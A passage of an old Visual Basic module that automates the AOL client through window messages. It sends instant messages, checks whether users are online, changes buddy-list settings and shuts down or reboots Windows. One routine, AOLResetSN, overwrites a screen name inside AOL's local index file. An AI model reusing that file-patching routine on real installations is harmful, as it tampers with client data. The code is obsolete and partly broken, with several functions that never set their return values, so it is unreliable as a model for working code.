End Sub
Sub ShutDownWin()
n = exitwindows(0, 0)
End Sub

Sub RestartWin()
n = exitwindows(66, 0)
End Sub
Sub RebootComp()
n = exitwindows(67, 0)
End Sub
Sub AOLFastIM(Who As String, messa As String)
If Online() = False Then Call ErrorMsg: Exit Sub
aol% = findwindow("AOL Frame25", 0&)
mdi% = GetWindowByClass(aol%, "MDIClient")
RunMenu "Send an Instant Message"
im% = WaitForWin("Send Instant Message")
aoledit% = GetWindowByClass(im%, "_AOL_Edit")
If GetAOL() = 2 Then message% = GetNextWindow(aoledit%, 1)
If GetAOL() = 3 Or GetAOL() = 95 Then message% = GetWindowByClass(im%, "RICHCNTL")
Call SetEdit(aoledit%, LCase$(Who$))
Call SetEdit(message%, mess$)
Sd% = GetNextWindow(message%, 1)
timeout (0.2)
Call CloseWin(im%)
If InStr(1, Who$, "$im_", 1) Then Call waitforok
End Sub

Sub CloseWin(hwnd As Integer)
X = sendmessagebynum(hwnd%, WM_Close, 0, 0)
End Sub


Function GetNextWindow(hwnd As Integer, Num As Integer) As Integer
NexthWnd% = hwnd%
For X = 1 To Num
NexthWnd% = getwindow(NexthWnd%, GW_HWNDNEXT)
Next X
GetNextWindow = NexthWnd%
End Function


Function GetAOL() As Integer
aol% = findwindow("AOL Frame25", 0&)
Menu% = Getmenu(aol%)
AOL2% = SearchMenu(Menu%, "Download Manager...")
If (AOL2% <> 0) Then
    GetAOL = 2
    Exit Function
End If
aol3% = SearchMenu(Menu%, "&Log Manager")
If (aol3% <> 0) Then
    AOL95% = SearchMenu(Menu%, "America Online Help &Topics")
    If (AOL95% <> 0) Then
        GetAOL = 95
    Else:
        GetAOL = 3
    End If
    Exit Function
End If
AOL4% = SearchMenu(Menu%, "Open Picture &Gallery...")
If (AOL4% <> 0) Then
    GetAOL = 4
    Exit Function
End If
    
'menu% = GetMenu(FindWindow("AOL Frame25", 0&))
'If menu% = 0 Then Exit Function
'MenuName$ = Space(500)
'x = GetMenuString(menu%, 0, MenuName$, 500, WM_USER)
'If InStr(1, FixAPIString(MenuName$), "*", 1) Then subMenu% = GetSubMenu(menu%, 1)
'If InStr(1, FixAPIString(MenuName$), "&File", 1) Then subMenu% = GetSubMenu(menu%, 0)
'mnuCount% = GetMenuItemCount(subMenu%)
'Count = 0
'Do
'    MenuName$ = String(500, Chr(32))
'    x = GetMenuString(subMenu%, Count, MenuName$, 500, WM_USER)
'    Count = Count + 1
'    If InStr(FixAPIString(MenuName$), "&Log Manager") Then Exit Do
'    If InStr(FixAPIString(MenuName$), "Download Manager...") Then Exit Do
'Loop Until Count = mnuCount%
'If InStr(FixAPIString(MenuName$), "&Log Manager") Then
'    mnuCount% = GetMenuItemCount(menu%)
'    MenuName$ = String(500, Chr(32))
'    If online() = True Then mnuCount% = mnuCount% - 1
'    x = GetMenuString(menu%, mnuCount% - 1, MenuName$, 500, WM_USER)
'    If InStr(1, MenuName$, "&Help", 1) Then Found = True
'    If Found = True Then
'        Found = False
'        SubMnu% = GetSubMenu(menu%, mnuCount% - 1)
'        SubMnuCount% = GetMenuItemCount(SubMnu%)
'        Count = 0
'        Do
'            MenuName$ = String(500, Chr(32))
'            x = GetMenuString(SubMnu%, Count, MenuName$, 500, WM_USER)
'            Count = Count + 1
'            MenuName$ = FixAPIString(MenuName$)
'            If InStr(1, MenuName$, "America Online Help &Topics", 1) Then
'                Found = True
'                Exit Do
'            End If
'        Loop Until Count = SubMnuCount%
'    End If
'    If Found = True Then
'        GetAOL = 95
'    Else :
'        GetAOL = 3
'    End If
'ElseIf InStr(FixAPIString(MenuName$), "Download Manager...") Then
'    GetAOL = 2
'Else :
'    GetAOL = 4
'End If
End Function


Function GetUserSN()
If AOLVersion2() = "3.0" Then
GetUserSN() = AOLGetUser()
ElseIf AOLVersion2() = "4.0" Then
GetUserSN() = AOL4_GetUser()
End If
End Function

Function SearchMenu(mnuWnd As Integer, MenuCaption As String) As Integer
mnuCount = GetMenuItemCount(mnuWnd%)
For Num = 0 To mnuCount - 1
    Text$ = Space(100)
    X = GetMenuString(mnuWnd%, Num, Text$, 100, WM_USER)
    Text$ = FixAPIString(Text$)
    SubMenu% = GetSubMenu(mnuWnd%, Num)
    If InStr(1, Text$, MenuCaption$, 1) Then
        SubMenu% = GetSubMenu(mnuWnd%, Num)
        Menu% = SubMenu%
        Menuid% = GetMenuItemID(mnuWnd%, Num)
    ElseIf (SubMenu% <> 0) Then
        Menuid% = SearchMenu(SubMenu%, MenuCaption$)
    End If
    If (Menuid% <> 0) Then
        Exit For
    End If
Next Num
SearchMenu = Menuid%
End Function
Function FixAPIString(sText As String) As String
On Error Resume Next
If InStr(sText$, Chr$(0)) <> 0 Then FixAPIString = Trim(Mid$(sText$, 1, InStr(sText$, Chr$(0)) - 1))
If InStr(sText$, Chr$(0)) = 0 Then FixAPIString = Trim(sText$)
End Function


Function WaitForWin(Caption As String) As Integer
aol% = findwindow("AOL Frame25", 0&)
mdi% = GetWindowByClass(aol%, "MDI Client")
Do While win% = 0
DoEvents
win% = GetWindowByTitle(mdi%, Caption$)
Loop
WaitForWin = win%
End Function

Sub RunMenu(MenuCaption As String)
aol% = findwindow("AOL Frame25", 0&)
Menu% = Getmenu(aol%)
id% = SearchMenu(Menu%, MenuCaption$)
X = sendmessagebynum(aol%, WM_COMMAND, id%, 0)

'AOL% = FindWindow("AOL Frame25", 0&)
'menu% = GetMenu(AOL%)
'mnuCount% = GetMenuItemCount(menu%)
'For Mnu = 0 To mnuCount%
'    subMenu% = GetSubMenu(menu%, Mnu)
'    SubMnuCount% = GetMenuItemCount(subMenu%)
'    For SubMnu = 0 To SubMnuCount%
'        SubSubMenu% = GetSubMenu(subMenu%, SubMnu)
'        'for menu's with double sub menu's
'        'If SubSubMenu% <> 0 Then
'        '    SubSubMnuCount% = GetMenuItemCount(SubSubMenu%)
'        '    For SubSubMnu = 0 To SubSubMnuCount%
'        '        txt$ = Space(256)
'        '        x = GetMenuString(SubSubMenu%, SubSubMnu, txt$, 256, True)
'        '        txt$ = FixAPIString(txt$)
'        '        If InStr(UCase(txt$), UCase(MenuCaption$)) Then
'        '            ID% = GetMenuItemID(SubSubMenu%, SubSubMnu)
'        '            Found = True
'        '        End If
'        '        If Found = True Then Exit For
'        '    Next SubSubMnu
'        '    If Found = True Then Exit For
'        'End If
'        Txt$ = Space(256)
'        x = GetMenuString(subMenu%, SubMnu, Txt$, 256, WM_USER)
'        Txt$ = FixAPIString(Txt$)
'        If InStr(UCase(Txt$), UCase(MenuCaption$)) Then
'            ID% = GetMenuItemID(subMenu%, SubMnu)
'            Found = True
'        End If
'        If Found = True Then Exit For
'    Next SubMnu
'    If Found = True Then Exit For
'Next Mnu
'x = SendMessageByNum(AOL%, WM_COMMAND, ID%, 0)
End Sub

Sub run(MenuCaption As String)
aol% = findwindow("AOL Frame25", 0&)
Menu% = Getmenu(aol%)
id% = SearchMenu(Menu%, MenuCaption$)
X = sendmessagebynum(aol%, WM_COMMAND, id%, 0)

'AOL% = FindWindow("AOL Frame25", 0&)
'menu% = GetMenu(AOL%)
'mnuCount% = GetMenuItemCount(menu%)
'For Mnu = 0 To mnuCount%
'    subMenu% = GetSubMenu(menu%, Mnu)
'    SubMnuCount% = GetMenuItemCount(subMenu%)
'    For SubMnu = 0 To SubMnuCount%
'        SubSubMenu% = GetSubMenu(subMenu%, SubMnu)
'        'for menu's with double sub menu's
'        'If SubSubMenu% <> 0 Then
'        '    SubSubMnuCount% = GetMenuItemCount(SubSubMenu%)
'        '    For SubSubMnu = 0 To SubSubMnuCount%
'        '        txt$ = Space(256)
'        '        x = GetMenuString(SubSubMenu%, SubSubMnu, txt$, 256, True)
'        '        txt$ = FixAPIString(txt$)
'        '        If InStr(UCase(txt$), UCase(MenuCaption$)) Then
'        '            ID% = GetMenuItemID(SubSubMenu%, SubSubMnu)
'        '            Found = True
'        '        End If
'        '        If Found = True Then Exit For
'        '    Next SubSubMnu
'        '    If Found = True Then Exit For
'        'End If
'        Txt$ = Space(256)
'        x = GetMenuString(subMenu%, SubMnu, Txt$, 256, WM_USER)
'        Txt$ = FixAPIString(Txt$)
'        If InStr(UCase(Txt$), UCase(MenuCaption$)) Then
'            ID% = GetMenuItemID(subMenu%, SubMnu)
'            Found = True
'        End If
'        If Found = True Then Exit For
'    Next SubMnu
'    If Found = True Then Exit For
'Next Mnu
'x = SendMessageByNum(AOL%, WM_COMMAND, ID%, 0)
End Sub


Function GetWindowByClass(Parent As Integer, ByVal Class As String) As Integer
win% = getwindow(getwindow(Parent%, GW_CHILD), GW_HWNDFIRST)
Do
Text$ = GetClass(win%)
If SpaceCase(Text$) = SpaceCase(Class$) Then Exit Do
If findchild = True Then
    If getwindow(win%, GW_CHILD) Then
        ChildWin% = GetWindowByClass(win%, Class$)
        If ChildWin% <> 0 Then
            win% = ChildWin%
            Exit Do
        End If
    End If
End If
win% = getwindow(win%, GW_HWNDNEXT)
Loop Until win% = 0
GetWindowByClass = win%
End Function


Function SpaceCase(Text As String) As String
txt$ = Text$
txt$ = Trim(UCase(RemoveSpace(txt$)))
SpaceCase = txt$
End Function


Function GetWindowByTitle(Parent As Integer, ByVal Title As String) As Integer
win% = getwindow(getwindow(Parent%, GW_CHILD), GW_HWNDFIRST)
Do
Text$ = FixAPIString(GetAPIText(win%))
If InStr(1, Text$, Title$, 1) Then Exit Do
If findchild = True Then
    If getwindow(win%, GW_CHILD) Then
        ChildWin% = GetWindowByTitle(win%, Title$)
        If ChildWin% <> 0 Then
            win% = ChildWin%
            Exit Do
        End If
    End If
End If
win% = getwindow(win%, GW_HWNDNEXT)
Loop Until win% = 0
GetWindowByTitle = win%
End Function


Function GetAPIText(hwnd As Integer) As String
    X = sendmessagebynum(hwnd%, WM_GetTextLength, 0, 0)
    Text$ = Space(X + 1)
    X = SendMessageByString(hwnd%, WM_GETTEXT, X + 1, Text$)
    GetAPIText = FixAPIString(Text$)
End Function

Sub ErrorMsg()
Randomize Timer
Select Case Int(Rnd * 3)
Case 0:
    Msg$ = "Please sign on before using this feature!"
Case 1:
    Msg$ = "Sign on First!"
Case 2:
    Msg$ = "Not Signed On."
End Select
MsgBox Msg$, 48
End Sub


Function Online() As Integer
aol% = findwindow("AOL Frame25", 0&)
mdi% = GetWindowByClass(aol%, "MDIClient")
welcome% = GetWindowByTitle(mdi%, "Welcome, ")
Cap$ = GetAPIText(welcome%)
If InStr(Cap$, ",") <> 0 Then Online = True
If InStr(Cap$, ",") = 0 Then Online = False
End Function

Sub FormFallDown(frm As Form, STEPS As Integer)
On Error Resume Next
BgColor = frm.BackColor
frm.BackColor = RGB(0, 0, 0)
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = False
Next X
AddX = True
AddY = True
frm.Show
X = ((Screen.Width - frm.Width) - frm.Left) / STEPS
Y = ((Screen.Height - frm.Height) - frm.Top) / STEPS
Do
    frm.Move frm.Left + X, frm.Top + Y
Loop Until (frm.Left >= (Screen.Width - frm.Width)) Or (frm.Top >= (Screen.Height - frm.Height))
frm.Left = Screen.Width - frm.Width
frm.Top = Screen.Height - frm.Height
frm.BackColor = BgColor
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = True
Next X
End Sub

Sub FavePlace(method As Integer, Description As String, URL As String)
aol% = findwindow("AOL Frame25", 0&)
mdi% = GetWindowByClass(aol%, "MDIClient")
Select Case method
Case 1:
    If aol% = 0 Then Exit Sub
    If GetAOL() = 2 Then
        AOLToolbar% = GetWindowByClass(aol%, "AOL Toolbar")
        AOLcon% = GetNextWindow(getwindow(AOLToolbar%, GW_CHILD), 19)
        Click AOLcon%
    End If
    If GetAOL() = 3 Or GetAOL() = 95 Then
        AOLToolbar% = GetWindowByClass(aol%, "AOL Toolbar")
        AOLcon% = GetNextWindow(getwindow(AOLToolbar%, GW_CHILD), 14)
        Click AOLcon%
    End If
    Do
        DoEvents
        FavoritePlaces% = GetWindowByTitle(mdi%, "Favorite Places")
    Loop Until (FavoritePlaces% <> 0)
    If (FavoritePlaces% <> 0) Then
        aoltree% = GetWindowByClass(FavoritePlaces%, "_AOL_Tree")
        Num = sendmessagebynum(aoltree%, LB_GETCOUNT, 0, 0)
        For X = 0 To Num - 1
            Length = sendmessagebynum(aoltree%, LB_GETTEXTLEN, X, 0)
            Text$ = Space(Length)
            i = SendMessageByString(aoltree%, LB_GETTEXT, X, Text$)
            Text$ = FixAPIString(Text$)
            If SpaceCase(Text$) = SpaceCase(Description$) Then
                i = sendmessagebynum(aoltree%, LB_Setcursel, X, 0)
                Exit Sub
            End If
        Next X
        AddPlace% = GetWindowByTitle(FavoritePlaces%, "Add Favorite Place")
        Click AddPlace%
        Do
        DoEvents
        AddFavPlace% = GetWindowByTitle(mdi%, "Add Favorite Place")
        Loop Until AddFavPlace% <> 0
        oK% = GetWindowByTitle(AddFavPlace%, "OK")
        EnterDES% = getwindow(GetWindowByTitle(AddFavPlace%, "Enter the Place's Description:"), GW_HWNDNEXT)
        EnterURL% = getwindow(GetWindowByTitle(AddFavPlace%, "Enter the Internet Address:"), GW_HWNDNEXT)
        Call SetEdit(EnterDES%, Description$)
        Call SetEdit(EnterURL%, URL$)
        Click oK%
    End If
Case 2:
    FavoritePlaces% = GetWindowByTitle(mdi%, "Favorite Places")
    If FavoritePlaces% = 0 Then
        If GetAOL() = 2 Then
            AOLToolbar% = GetWindowByClass(aol%, "AOL Toolbar")
            AOLIcn% = GetNextWindow(getwindow(AOLToolbar%, GW_CHILD), 19)
            Click AOLIcn%
        End If
        If GetAOL() = 3 Or GetAOL() = 95 Then
            AOLToolbar% = GetWindowByClass(aol%, "AOL Toolbar")
            AOLIcn% = GetNextWindow(getwindow(AOLToolbar%, GW_CHILD), 14)
            Click AOLIcn%
        End If
    End If
    If (FavoritePlaces% <> 0) Then
        aoltree% = GetWindowByClass(FavoritePlaces%, "_AOL_Tree")
        Num = sendmessagebynum(aoltree%, LB_GETCOUNT, 0, 0)
        For X = 0 To Num - 1
            Length = sendmessagebynum(aoltree%, LB_GETTEXTLEN, X, 0)
            Text$ = Space(Length)
            i = SendMessageByString(aoltree%, LB_GETTEXT, X, Text$)
            Text$ = FixAPIString(Text$)
            If SpaceCase(Text$) = SpaceCase(Description$) Then
                i = sendmessagebynum(aoltree%, LB_Setcursel, X, 0)
            End If
        Next X
        Connect% = GetWindowByTitle(FavoritePlaces%, "Connect")
        Click Connect%
    End If
End Select
End Sub


Function GenerateAscii(Text As String) As String
Select Case Int(Rnd * 4)
Case 0:
    Arrow1$ = "«"
    Arrow2$ = "»"
Case 1:
    Arrow1$ = "—"
    Arrow2$ = "—"
Case 2:
    Arrow1$ = "—"
    Arrow2$ = "—"
Case 3:
    Arrow1$ = "·"
    Arrow2$ = "·"
End Select
For X = 0 To Int(Rnd * 5) + 1
    Select Case Int(Rnd * 7)
        Case 0:
            Arrow1$ = Arrow1$ + "·"
            Arrow2$ = "·" + Arrow2$
        Case 1:
            Arrow1$ = Arrow1$ + "÷"
            Arrow2$ = "÷" + Arrow2$
        Case 2:
            Arrow1$ = Arrow1$ + "•"
            Arrow2$ = "•" + Arrow2$
        Case 3:
            Arrow1$ = Arrow1$ + "×"
            Arrow2$ = "×" + Arrow2$
        Case 4:
            Arrow1$ = Arrow1$ + "¤"
            Arrow2$ = "¤" + Arrow2$
        Case 5:
            Arrow1$ = Arrow1$ + "["
            Arrow2$ = "]" + Arrow2$
        Case 6:
            Arrow1$ = Arrow1$ + "(•"
            Arrow2$ = "•)" + Arrow2$
    End Select
Next X
GenerateAscii = Arrow1$ + Text$ + Arrow2$
End Function

Function GetChildWin(Parent As Integer, Caption As String, Class As String) As Integer
win% = getwindow(getwindow(Parent%, GW_CHILD), GW_HWNDFIRST)
Do
Text1$ = GetAPIText(win%)
text2$ = GetClass(win%)
If InStr(1, Text1$, Caption$, 1) And InStr(1, text2$, Class$, 1) Then Exit Do
win% = getwindow(win%, GW_HWNDNEXT)
Loop Until win% = 0
GetChildWin = win%
End Function

Function GetSystemInfo(WinDir As String, SystemDir As String)
txt$ = Space(256)
X = GetWindowsDirectory(txt$, 256)
WinDir$ = LCase(FixAPIString(txt$))
txt$ = Space(256)
X = GetSystemDirectory(txt$, 256)
SystemDir$ = LCase(FixAPIString(txt$))
End Function

Sub AOLInviteOff()
If Online() = False Then Call ErrorMsg: Exit Sub
aol% = findwindow("AOL Frame25", 0&)
mdi% = GetWindowByClass(aol%, "MDIClient")
Call keyword("Buddy List")
buddy% = WaitForWin(GetUserSN() + "'s Buddy List Groups")
Pref% = getwindow(GetWindowByTitle(buddy%, "Preferences"), GW_HWNDNEXT)
Do
DoEvents
Click Pref%
preferences% = GetWindowByTitle(mdi%, "Buddy List Preferences")
Loop Until preferences% <> 0
Off% = GetWindowByClass(preferences%, "_AOL_Static")
For X = 1 To 8
    Off% = getwindow(Off%, GW_HWNDNEXT)
Next X
X = sendmessagebynum(Off%, BM_SETCHECK, False, 0)
Off% = getwindow(Off%, GW_HWNDNEXT)
X = sendmessagebynum(Off%, BM_SETCHECK, True, 0)
Off% = getwindow(Off%, GW_HWNDNEXT)
X = sendmessagebynum(Off%, BM_SETCHECK, False, 0)
Off% = getwindow(Off%, GW_HWNDNEXT)
X = sendmessagebynum(Off%, BM_SETCHECK, False, 0)
AOLIcn% = getwindow(GetWindowByClass(preferences%, "_AOL_Edit"), GW_HWNDNEXT)
For X = 1 To 4
AOLIcn% = getwindow(AOLIcn%, GW_HWNDNEXT)
Next X
Do
DoEvents
Click (AOLIcn%)
Saved% = findwindow("#32770", "America Online")
Loop Until Saved% <> 0
Call CloseWin(Saved%)
Call CloseWin(buddy%)
End Sub
Sub keyword(key As String)
If Online() = False Then Exit Sub
aol% = findwindow("AOL Frame25", 0&)
mdi% = GetWindowByClass(aol%, "MDI Client")
KeyWindow% = GetWindowByTitle(mdi%, "Keyword")
If (KeyWindow% = 0) Then
    RunMenu "Keyword..."
    Do
    DoEvents
    KeyWindow% = GetWindowByTitle(mdi%, "Keyword")
    Loop Until (KeyWindow% <> 0)
End If
DoEvents
aoledit% = GetWindowByClass(KeyWindow%, "_AOL_Edit")
Call SetEdit(aoledit%, key$)
Call Enter(aoledit%)
End Sub
Sub Enter(ByVal hwnd As Integer)
X = sendmessagebynum(hwnd%, WM_CHAR, 13, 0)
End Sub


Sub AOLInviteOn()
If Online() = False Then Call ErrorMsg: Exit Sub
aol% = findwindow("AOL Frame25", 0&)
mdi% = GetWindowByClass(aol%, "MDIClient")
Call keyword("Buddy List")
buddy% = WaitForWin(GetUserSN() + "'s Buddy List Groups")
Pref% = getwindow(GetWindowByTitle(buddy%, "Preferences"), GW_HWNDNEXT)
Do
DoEvents
Click Pref%
preferences% = GetWindowByTitle(mdi%, "Buddy List Preferences")
Loop Until preferences% <> 0
Off% = GetWindowByClass(preferences%, "_AOL_Static")
For X = 1 To 8
    Off% = getwindow(Off%, GW_HWNDNEXT)
Next X
X = sendmessagebynum(Off%, BM_SETCHECK, True, 0)
Off% = getwindow(Off%, GW_HWNDNEXT)
X = sendmessagebynum(Off%, BM_SETCHECK, False, 0)
Off% = getwindow(Off%, GW_HWNDNEXT)
X = sendmessagebynum(Off%, BM_SETCHECK, False, 0)
Off% = getwindow(Off%, GW_HWNDNEXT)
X = sendmessagebynum(Off%, BM_SETCHECK, False, 0)
AOLIcn% = getwindow(GetWindowByClass(preferences%, "_AOL_Edit"), GW_HWNDNEXT)
For X = 1 To 4
AOLIcn% = getwindow(AOLIcn%, GW_HWNDNEXT)
Next X
Do
DoEvents
Click (AOLIcn%)
Saved% = findwindow("#32770", "America Online")
Loop Until Saved% <> 0
Call CloseWin(Saved%)
Call CloseWin(buddy%)

End Sub

Function AOLLocate(Who As String) As String
If Online() = False Then Call ErrorMsg: Exit Function
aol% = findwindow("AOL Frame25", 0&)
mdi% = GetWindowByClass(aol%, "MDIClient")
RunMenu "Send an Instant Message"
Do
    DoEvents
    im% = GetWindowByTitle(mdi%, "Send Instant Message")
Loop Until im% <> 0
aoledit% = GetWindowByClass(im%, "_AOL_Edit")
If GetAOL() = 2 Then message% = GetNextWindow(aoledit%, 1)
If GetAOL() = 3 Or GetAOL() = 95 Then message% = GetWindowByClass(im%, "RICHCNTL")
Call SetEdit(aoledit%, Who$)
Call SetEdit(message%, " ")
Avail% = GetWindowByTitle(im%, "Available")
If Avail% = 0 Then Avail% = GetNextWindow(message%, 1)
Click Avail%
Do
    DoEvents
    Off% = findwindow("#32770", "America Online")
    MsgStatic% = GetNextWindow(GetWindowByClass(Off%, "Static"), 1)
    If (Off% <> 0) Then
        txt$ = GetAPIText(MsgStatic%)
        Locate = txt$
        Call CloseWin(Off%)
        Call CloseWin(im%)
        Exit Do
    End If
Loop
Call CloseWin(im%)

End Function
Function AOLLocateOnline(Who As String) As Integer
If Online() = False Then Call ErrorMsg: Exit Function
aol% = findwindow("AOL Frame25", 0&)
mdi% = GetWindowByClass(aol%, "MDIClient")
RunMenu "Send an Instant Message"
Do
    DoEvents
    im% = GetWindowByTitle(mdi%, "Send Instant Message")
Loop Until im% <> 0
aoledit% = GetWindowByClass(im%, "_AOL_Edit")
If GetAOL() = 2 Then message% = GetNextWindow(aoledit%, 1)
If GetAOL() = 3 Or GetAOL() = 95 Then message% = GetWindowByClass(im%, "RICHCNTL")
Call SetEdit(aoledit%, Who$)
Call SetEdit(message%, " ")
Avail% = GetWindowByTitle(im%, "Available")
If Avail% = 0 Then Avail% = GetNextWindow(message%, 1)
Click Avail%
Do
    DoEvents
    Off% = findwindow("#32770", "America Online")
    MsgStatic% = GetNextWindow(GetWindowByClass(Off%, "Static"), 1)
    If (Off% <> 0) Then
        txt$ = GetAPIText(MsgStatic%)
        If InStr(1, txt$, "is not currently signed on.", 1) Then
            LocateOnline = False
        Else:
            LocateOnline = True
        End If
        Call CloseWin(Off%)
        Call CloseWin(im%)
        Exit Do
    End If
Loop
Call CloseWin(im%)
End Function

Sub PercentBar(Shape As Control, Done As Integer, Total As Variant)
On Error Resume Next
Shape.AutoRedraw = True
Shape.FillStyle = 0
Shape.DrawStyle = 0
Shape.FontName = "MS Sans Serif"
Shape.FontSize = 8.25
Shape.FontBold = False
X = Done / Total * Shape.Width
Shape.Line (0, 0)-(Shape.Width, Shape.Height), RGB(255, 255, 255), BF
Shape.Line (0, 0)-(X - 10, Shape.Height), RGB(0, 0, 255), BF
Shape.CurrentX = (Shape.Width / 2) - 100
Shape.CurrentY = (Shape.Height / 2) - 125
Shape.ForeColor = RGB(255, 0, 0)
Shape.Print Percent(Done, Total, 100) & "%"
End Sub

Function Percent(Complete As Integer, Total As Variant, TotalOutput As Integer) As Integer
On Error Resume Next
Percent = Int(Complete / Total * TotalOutput)
End Function


Sub AOLResetSN(SN As String, aoldir As String, Replace As String)
'Call AOLResetSN("SN","C:\aol30","New SN"
SN$ = SN$ + String(10 - Len(SN$), Chr(32))
Replace$ = Replace$ + String(10 - Len(Replace$), Chr(32))
Free = FreeFile
Open aoldir$ + "\idb\main.idx" For Binary As #Free
For X = 1 To LOF(Free) Step 32000
    Text$ = Space(32000)
    Get #Free, X, Text$
Search:
    If InStr(1, Text$, SN$, 1) Then
        where = InStr(1, Text$, SN$, 1)
        Put #Free, (X + where) - 1, Replace$
        Mid$(Text$, where, 10) = String(10, " ")
        GoTo Search
    End If
    DoEvents
Next X
Close #Free
End Sub
Function ScanFile(FileName As String, SearchString As String) As Long
'ScanFile("C:\FileName.???","String to Search for")
Free = FreeFile
Dim where As Long
Open FileName$ For Binary Access Read As #Free
For X = 1 To LOF(Free) Step 32000
    Text$ = Space(32000)
    Get #Free, X, Text$
    Debug.Print X
    If InStr(1, Text$, SearchString$, 1) Then
        where = InStr(1, Text$, SearchString$, 1)
        ScanFile = (where + X) - 1
        Close #Free
        Exit For
    End If
    Next X
Close #Free
End Function
Sub AOLSendInvite(Who As String, message As String, room As String, Check As Integer)
If Online() = False Then Exit Sub
aol% = findwindow("AOL Frame25", 0&)
mdi% = GetWindowByClass(aol%, "MDI Client")
BuddyView% = GetWindowByTitle(mdi%, "Buddy List Window")
If BuddyView% = 0 Then
    keyword "Buddy View"
    BuddyView% = WaitForWin("Buddy List Window")
End If
BuddyChatIcon% = GetNextWindow(GetWindowByClass(BuddyView%, "_AOL_ListBox"), 4)
Click BuddyChatIcon%
SendBuddyChat% = WaitForWin("Buddy Chat")
WhoBox% = GetWindowByClass(SendBuddyChat%, "_AOL_Edit")
MessageBox% = GetNextWindow(WhoBox%, 2)
where% = GetNextWindow(MessageBox%, 6)
Snd% = GetWindowByClass(SendBuddyChat%, "_AOL_Icon")
Call SetEdit(WhoBox%, Who$)
Call SetEdit(MessageBox%, message$)
Call SetEdit(where%, Mid(room$, 1, 75))
Click Snd%
Do
DoEvents
i = i + 1
If i = 50 Then i = 0: Click Snd%
If Check = True Then
    inFrom% = GetWindowByTitle(mdi%, "Invitation From: " + GetUserSN())
End If
If Check = False Then
    SendBuddyChat% = GetWindowByTitle(mdi%, "Buddy Chat")
    If SendBuddyChat% = 0 Then Exit Do
End If
Loop Until inFrom% <> 0
Call CloseWin(inFrom%)
End Sub
Sub SetMenuBMP(frm As Form, SubMenu As Integer, mnuID As Integer, BMP As Long)
Call ModifyMenu(SubMenu%, mnuID%, MF_BITMAP Or MF_BYCOMMAND, mnuID%, BMP)
hd% = GetDC(frm.hwnd)
hMemDC = CreateCompatibleDC(hd%)
X = ReleaseDC(frm.hwnd, hd%)
X = DeleteDC(hMemDC)
End Sub
Sub SetMenuFont(frm As Form, mnuWnd As Integer, FontName As String, FontSize As Integer)
ReDim hBmp(200) As Long
DC% = frm.hDC
hMemDC = CreateCompatibleDC(DC%)
mnuCount = GetMenuItemCount(mnuWnd%)
For Num = 0 To mnuCount - 1
    mnuID% = GetMenuItemID(mnuWnd%, Num)
    Text$ = Space(200)
    X = GetMenuString(mnuWnd%, Num, Text$, 200, WM_USER)
    Text$ = FixAPIString(Text$)
    hFont = CreateFont(FontSize, 0, 0, 0, 200, 0, 0, 0, 0, 0, 0, 0, 0, FontName$)
    hBmp(Num) = CreateCompatibleBitmap(hMemDC, Len(Text$) * 6, Abs(FontSize) + 2)
    hOldBmp = SelectObject(hMemDC, hBmp(Num))
    X = SelectObject(hMemDC, hFont)
    X = settextcolor(hMemDC, frm.ForeColor)
    Call Rectangle(hMemDC, -1, -1, 201, 19)
    If Len(Text$) > 0 Then
        X = TextOut(hMemDC, 0, 0, Text$, Len(Text$))
        hBmp(Num) = SelectObject(hMemDC, hOldBmp)
        Call DeleteObject(hFont)
        Call ModifyMenu(mnuWnd%, mnuID%, MF_BITMAP Or MF_BYCOMMAND, mnuID%, hBmp(Num))
    End If
    SubMenu% = GetSubMenu(mnuWnd%, Num)
    If (SubMenu% <> 0) Then
        Call SetMenuFont(frm, SubMenu%, FontName$, FontSize)
    End If
Next Num
X = ReleaseDC(frm.hwnd, DC%)
X = DeleteDC(hMemDC)
End Sub


Sub Mail_KeepAllAsNew()


mail = FindChildByTitle(GetMDI(), "New Mail")
Tree = FindChildByClass(mail, "_AOL_TREE")
For D = 0 To sendmessagebynum(Tree, LB_GETCOUNT, 0, 0&) - 1
s = sendmessagebynum(Tree, LB_Setcursel, D, 0&)
Click FindChildByTitle(mail, "Keep As New")
Next D
End Sub

Function GetMDI()
'This Is Basically for 32 Bit Proggin
'This Just Saves time so you dont have to write that
'MDI = FindChildbyClass(GetAOL(),"MDIClient"), Bullshit a million times
'Example: IM = FindChildByTitle(GetMDI(),"Send Instant Message")
aol = findwindow("AOL Frame25", 0&)
GetMDI = FindChildByClass(aol, "MDIClient")
End Function


Sub Click(Wh)


DoEvents
X = sendmessagebynum(Wh, WM_LBUTTONDOWN, 0, 0&)

X = sendmessagebynum(Wh, WM_LBUTTONUP, 0, 0&)
End Sub


Sub DeleteName(lst As Control, Del)
'Seraches for an Item on a Control (ListBox) and Deletes it
'Example: Call DeleteName(List1,"SN")
For i = 0 To lst.ListCount - 1
If UCase(Del) Like UCase(lst.List(i)) Then lst.RemoveItem i
Next i
End Sub


Function MsgBoxText()
'gets MSGBOX text
'Ex..: Text1 = MsgBoxText()
Yo% = findwindow("#32770", 0&)
Sta% = FindChildByClass(Yo%, "STATIC")
s% = GetNextWindow(Sta%, 2)
GetMsgBoxText = GetWinText(s%)
End Function

Sub FadePreview_3Colors(pic As Object, a1%, a2%, a3%, b1%, b2%, b3%, b4%, C1%, C2%, C3%)
'Modified by Skybox¹ for 3 and More Colors
'See FadePreview_2Colors for info

On Error Resume Next 'If an Error go to Next
Static FirstColor(3) As Double
Static SecondColor(3) As Double
Static ThirdColor(3) As Double
Static SplitNum(3) As Double
Static SplitNum2(3) As Double
Static DivideNum(3) As Double
Static DivideNum2(3) As Double
Dim FadeW As Integer
Dim Loo As Integer
Dim Loo2 As Integer

'First Color
FirstColor(1) = a1
FirstColor(2) = a2
FirstColor(3) = a3
'Second Color
SecondColor(1) = b1
SecondColor(2) = b2
SecondColor(3) = b3
'Third Color
ThirdColor(1) = C1
ThirdColor(2) = C2
ThirdColor(3) = C3
'Splits First and Second Color
SplitNum(1) = SecondColor(1) - FirstColor(1)
SplitNum(2) = SecondColor(2) - FirstColor(2)
SplitNum(3) = SecondColor(3) - FirstColor(3)
SplitNum2(1) = ThirdColor(1) - SecondColor(1)
SplitNum2(2) = ThirdColor(2) - SecondColor(2)
SplitNum2(3) = ThirdColor(3) - SecondColor(3)

DivideNum(1) = SplitNum(1) / 50
DivideNum(2) = SplitNum(2) / 50
DivideNum(3) = SplitNum(3) / 50
DivideNum2(1) = SplitNum2(1) / 50
DivideNum2(2) = SplitNum2(2) / 50
DivideNum2(3) = SplitNum2(3) / 50
FadeW = pic.Width / 100

For Loo = 0 To 50
'Draws Fade
